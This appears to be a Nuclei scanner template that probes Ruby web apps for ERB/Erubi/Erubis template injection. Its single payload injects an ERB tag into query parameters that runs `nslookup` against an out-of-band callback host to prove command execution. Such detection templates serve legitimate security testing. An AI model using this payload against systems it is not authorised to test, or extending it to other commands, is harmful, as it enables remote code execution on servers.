id: erb-erubi-erubis-oob

info:
  name: Erb OR Erubi OR Erubis - Out of Band Template Injection
  author: 0xAwali,DhiyaneshDK
  severity: unknown
  reference:
    - https://rubygems.org/gems/erb
    - https://rubygems.org/gems/erubis
    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
  metadata:
    verified: true
  tags: ssti,dast,oast,oob

variables:
  first: "{{rand_int(1000, 9999)}}"
  second: "{{rand_int(1000, 9999)}}"
  third: "{{rand_int(1000, 9999)}}"
  result: "{{first}}{{second}}"

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        - '<%25%3d(`nslookup+{{interactsh-url}}`)%25>'

    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{injection}}"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

      - type: word
        part: server
        words:
          - "WEBrick"
          - "Ruby"